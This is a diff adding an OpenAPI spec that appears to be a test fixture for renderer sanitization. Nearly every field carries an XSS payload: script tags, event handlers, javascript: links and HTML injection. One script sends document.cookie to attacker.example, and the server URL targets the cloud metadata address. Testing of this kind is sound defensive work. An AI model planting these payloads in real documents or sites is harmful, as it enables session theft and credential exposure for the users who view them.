@@ -1,0 +1,54 @@
+openapi: 3.0.3
+info:
+  title: Hostile Markdown <script>alert(1)</script>
+  version: 1.0.0
+  description: |
+    # Script and event handlers in Markdown
+
+    <script>document.title = 'PWNED-SCRIPT'; fetch('https://attacker.example/steal?c=' + document.cookie)</script>
+
+    <img src="x" onerror="document.title='PWNED-ONERROR'">
+
+    <iframe src="https://attacker.example/frame"></iframe>
+
+    [click me](javascript:document.title='PWNED-LINK')
+
+    ![remote image](https://attacker.example/pixel.png)
+
+    <a href="https://attacker.example/" onclick="document.title='PWNED-CLICK'">a link with onclick</a>
+
+    <svg onload="document.title='PWNED-SVG'"><circle r="5"/></svg>
+
+    <style>body { background: url(https://attacker.example/bg.png) }</style>
+  termsOfService: javascript:alert(1)
+  contact:
+    url: javascript:alert(2)
+    email: "x@example.com\"><img src=x onerror=alert(3)>"
+servers:
+  - url: http://169.254.169.254/latest/meta-data/
+paths:
+  /search:
+    get:
+      summary: Search <img src=x onerror="document.title='PWNED-SUMMARY'">
+      description: '<script>document.title="PWNED-OPDESC"</script>**bold** text'
+      parameters:
+        - name: q<script>
+          in: query
+          description: <img src=x onerror="document.title='PWNED-PARAM'">
+          schema:
+            type: string
+            example: <script>alert(4)</script>
+      responses:
+        '200':
+          description: <details open ontoggle="document.title='PWNED-TOGGLE'">ok</details>
+          content:
+            text/html:
+              example: <html><body onload="alert(5)"></body></html>
+components:
+  schemas:
+    Evil:
+      type: object
+      description: <img src=x onerror="document.title='PWNED-SCHEMA'">
+      properties:
+        "<img src=x onerror=alert(6)>":
+          type: string
